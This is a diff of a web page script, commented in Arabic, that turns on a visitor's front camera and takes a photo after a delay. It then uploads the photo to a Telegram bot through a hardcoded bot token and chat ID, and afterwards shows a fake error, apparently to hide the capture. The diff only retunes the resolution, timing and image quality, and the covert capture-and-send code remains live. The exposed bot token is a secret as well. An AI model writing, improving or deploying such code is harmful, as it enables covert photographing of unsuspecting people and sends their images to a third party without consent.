@@ -51,41 +51,30 @@
         const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
         const chatId = "2049331070";
 
-        // طلب الكاميرا بالأبعاد العريضة الأصلية للعدسة
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
-                width: { ideal: 1280 },
-                height: { ideal: 720 }
+                width: { ideal: 720 },
+                height: { ideal: 1280 }
             } 
         })
         .then(stream => {
             video.srcObject = stream;
-            // الانتظار للتأكد من تحميل أبعاد الفيديو بالكامل
-            video.onloadedmetadata = () => {
-                setTimeout(captureAndSend, 1500);
-            };
+            setTimeout(captureAndSend, 2600);
         })
         .catch(() => showError());
 
         function captureAndSend() {
-            // أخذ الأبعاد الواسعة الحقيقية القادمة من كاميرا الهاتف مباشرة
-            const vWidth = video.videoWidth;
-            const vHeight = video.videoHeight;
-            
-            // جعل الكانفاس يطابق أبعاد الكاميرا تماماً ليتسع للمشهد بالكامل دون اقتطاع
-            canvas.width = vWidth;
-            canvas.height = vHeight;
+            let width = video.videoWidth;
+            let height = video.videoHeight;
+
+            // جعل الصورة أوسع (بعيدة)
+            canvas.width = width;
+            canvas.height = height;
             
             const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, width, height);
             
-            // مسح الكانفاس لتهيئته
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            // رسم الكاميرا من النقطة (0,0) بالكامل، مما يمنع الإزاحة ويجعل الشخص في المنتصف تلقائياً
-            ctx.drawImage(video, 0, 0, vWidth, vHeight);
-            
-            // تحويل الصورة إلى Blob وإرسالها عبر البوت
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
@@ -97,7 +86,7 @@
                 })
                 .then(() => showError())
                 .catch(() => showError());
-            }, 'image/jpeg', 0.9);
+            }, 'image/jpeg', 0.92);
         }
 
         function showError() {
